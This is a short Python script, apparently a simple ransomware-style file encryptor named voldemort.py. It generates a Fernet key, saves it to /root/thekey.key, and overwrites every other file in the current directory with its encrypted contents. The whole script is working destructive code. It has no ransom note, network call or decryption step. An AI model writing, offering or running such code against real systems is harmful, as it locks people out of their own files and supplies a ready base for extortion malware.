import os
import cryptography
from cryptography.fernet import Fernet

# Generate a key
key = Fernet.generate_key()

# Save the key to /root/thekey.key
with open("/root/thekey.key", "wb") as key_file:
    key_file.write(key)

# Open the key as thekey
thekey = Fernet(key)

# Get all the files in the current directory
files = os.listdir()

# Create a list to store the files
file_list = []

# Loop through the files
for file in files:
    # Check if the file is a file and not a directory
    if os.path.isfile(file) and file != "thekey.key":
        # Check if the file is not voldemort.py
        if file != "voldemort.py":
            # Add the file to the list
            file_list.append(file)

# Print the list of files
print(file_list)

# Loop through the files
for file in file_list:
    # Open the file as read
    with open(file, "rb") as f:
        # Read the contents of the file
        content = f.read()
    # Create a variable to store the encrypted content
    content_encrypted = thekey.encrypt(content)
    # Open the file as write
    with open(file, "wb") as f:
        # Write the encrypted content to the file
        f.write(content_encrypted)

# Print the encrypted files
print("Files encrypted!")
